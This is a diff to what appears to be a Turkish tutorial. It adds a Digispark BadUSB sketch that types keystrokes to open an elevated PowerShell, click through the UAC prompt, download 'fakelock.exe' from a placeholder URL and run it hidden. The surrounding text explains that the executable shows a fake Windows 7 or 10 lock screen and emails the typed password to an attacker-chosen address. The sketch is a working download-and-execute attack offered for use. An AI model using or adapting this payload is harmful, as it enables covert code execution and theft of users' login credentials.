@@ -78,7 +78,43 @@ Kaynak kodlardan da görebileceğiniz gibi oldukça basit bir kodlamadır.
 Aynı kodları kullanarak win7 ve win10 görseli hazırladım
 Kodları ikinci defa yazmamın sebebi girilen texti hem enter tuşuna bastığında hem de ekrandaki ok işaretine bastığı zaman belirlediğimiz mail adresine göndermesi içindir.
 
+<strong>Digispark kodları</strong>
 
+<code><pre>#define kbd_tr_tr
+#include "DigiKeyboard.h"
+void setup() {
+}
 
+void loop() {
+  //coder sefaoruc
+  //youtube youtube.com/siberdunya
+  //bu kodlar win10 için sahte bir login sayfası oluşturur
+  //fake lock screen win10
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print(F("powershell Start-Process powershell -Verb runAs"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT ,KEY_Y);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print(F("Invoke-WebRequest -Uri ('DOWNLOAD_URL') -O C:/fakelock.exe"));
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("powershell -windowstyle hidden 'C:/fakelock.exe'");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for (;;) {
+    /*son*/
+  }
+}
+</code></pre>
+
+Digispark kodlarını da bu şekilde oluşturdum
+
+Mantık Powershell admin olarak başlatmak ve upload ettiğimiz win7 veya win10 exe dosyasını indirip çalıştırmaktır.
 
 
